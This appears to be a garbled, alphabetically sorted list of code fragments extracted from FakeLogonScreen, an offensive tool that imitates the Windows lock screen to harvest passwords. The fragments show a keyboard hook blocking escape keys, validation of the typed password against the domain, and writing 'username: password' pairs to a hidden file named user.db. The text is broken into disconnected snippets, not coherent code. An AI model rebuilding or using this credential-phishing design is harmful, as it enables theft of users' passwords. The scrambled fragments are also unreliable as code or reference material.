@@ -1,0 +1,166 @@
+"("""""
+"(""1.0.*"""
+"(""1.0.0.0"""
+"(""FakeLogonScreen"""
+"(""FakeLogonScreen.Properties.Resources"", typeof(Resources"
+"(""Microsoft Sans Serif"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
+"(""Microsoft.Performance"", ""CA1811:AvoidUncalledPrivateCode"""
+"(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""16.4.0.0"""
+"(""Output written to {0}"", path"
+"(""Segoe UI Light"", 12F"
+"(""Segoe UI Semilight"", 39.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
+"(""Shell_TrayWnd"", null"
+"(""SubmitIcon"", resourceCulture"
+"(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""16.0.0.0"""
+"(""UserIcon"", resourceCulture"
+"(""d35a55bd-3189-498b-b72f-dc798172e505"""
+"(""img{0}"", ord + 10 + (90 - ord"
+"(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true"
+"(""user32.dll"", CharSet = CharSet.Auto"
+"(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true"
+"(""user32.dll"", EntryPoint = ""FindWindow"", SetLastError = true"
+"(""user32.dll"", EntryPoint = ""SendMessage"", SetLastError = true"
+"(""{0}: {1} --> {2}"", this.Username, password, success ? ""Correct"" : ""Wrong"""
+"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
+"(0, 90, 158"
+"(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName"
+"(192, 315"
+"(200, 200"
+"(200, 26"
+"(250, 3"
+"(251, 12"
+"(26, 26"
+"(3, 15, 3, 0"
+"(3, 206"
+"(3, 368"
+"(3, 403"
+"(3, 441"
+"(315, 50"
+"(42, 257"
+"(51, 12"
+"(694, 106"
+"(694, 20"
+"(694, 23"
+"(694, 50"
+"(6F, 13F"
+"(700, 511"
+"(800, 811"
+"(@""SOFTWARE\Microsoft\Windows\CurrentVersion\SystemProtectedUserData\{0}\AnyoneRead\LockScreen"", SID"
+"(@""{0}\LockScreen_{1}"", customImagePath, imageOrder[0]"
+"(@""{0}\Microsoft\Windows\SystemData\{1}\ReadOnly"", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData"
+"(@""{0}\Microsoft\user.db"", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData"
+"(Directory.GetFiles(webScreenPath, ""img*"""
+"(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam"
+"(IntPtr hook, int nCode, IntPtr wp, IntPtr lp"
+"(StreamWriter file = new StreamWriter(path, true"
+"(Username, password"
+"(https://raw.githubusercontent.com/bitsadmin/fakelogonscreen/master/demo.gif ""FakeLogonScreen demo in Cobalt Strike"""
+"(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId"
+"(int nCode, IntPtr wParam, IntPtr lParam"
+"(int nCode, IntPtr wp, IntPtr lp"
+"(lHwnd, WM_COMMAND, (IntPtr"
+"(lp, typeof(KBDLLHOOKSTRUCT"
+"(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F"
+"(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20F"
+"(object fSender, FormClosingEventArgs fe"
+"(object sender, EventArgs e"
+"(object sender, FormClosingEventArgs e"
+"(object sender, KeyEventArgs e"
+"(object.ReferenceEquals(resourceMan, null"
+"(path, FileAttributes.Hidden | FileAttributes.System"
+"(ptrHook, nCode, wp, lp"
+"(s.WorkingArea.Left, s.WorkingArea.Top"
+"(string lpClassName, string lpWindowName"
+"(string.Format(@""{0}\{1}"", webScreenPath, image"
+"(this.lblError, 0, 3"
+"(this.lblUsername, 0, 1"
+"(this.llblResetPassword, 0, 4"
+"(this.llblSigninOptions, 0, 5"
+"(this.pPassword, 0, 2"
+"(this.pbUser, 0, 0"
+(!string.IsNullOrEmpty(DisplayName
+(!string.IsNullOrEmpty(Username
+(!success
+('$(MSBuildExtensionsPath
+(((MaskedTextBox
+((Settings
+((System.ComponentModel.ISupportInitialize
+((System.Drawing.Bitmap
+(0
+(Configuration
+(Default
+(Exception
+(Exception e
+(ExtensibilityGlobals
+(File.Exists(imagePath
+(INCLUDING NEGLIGENCE OR OTHERWISE
+(IntPtr
+(IntPtr hook
+(KBDLLHOOKSTRUCT
+(Keys key
+(LayoutKind.Sequential
+(MSBuildExtensionsPath
+(MSBuildToolsPath
+(MSBuildToolsVersion
+(ModifierKeys & Keys.Control
+(MonoDevelop/Xamarin Studio
+(PTVS
+(Platform
+(PrincipalContext context = new PrincipalContext(Context
+(ProjectConfigurationPlatforms
+(SID
+(Screen s in Screen.AllScreens
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(Xamarin productivity tool
+([0-9]
+([0-9][0-9]
+([@bitsadmin](https://twitter.com/bitsadmin/
+(bool disposing
+(c
+(captureKey
+(contains which files were open etc.
+(cross platform F# VS Code tools
+(customLockScreenPath
+(disposing
+(disposing && (components != null
+(e
+(e.KeyCode == Keys.Enter
+(false
+(flags & 0x20
+(global::System.ComponentModel.EditorBrowsableState.Advanced
+(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings(
+(https://github.com/bitsadmin/fakelogonscreen/releases
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(imagePath
+(int
+(int flags
+(line
+(local
+(nCode >= 0
+(new System.Windows.Forms.RowStyle(
+(null
+(obj
+(objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags
+(ord > 78
+(regLockScreen == null
+(regPath
+(root
+(s
+(s.Primary
+(sass
+(string
+(string SID
+(string name
+(string.IsNullOrEmpty(Username
+(string.IsNullOrEmpty(password
+(this.Screen_FormClosing
+(this.Screen_Load
+(this.mtbPassword
+(this.mtbPassword_KeyUp
+(this.pbSubmit
+(this.pbSubmit_Click
+(this.pbUser
+(this.tlpControls
+(with potential passwords
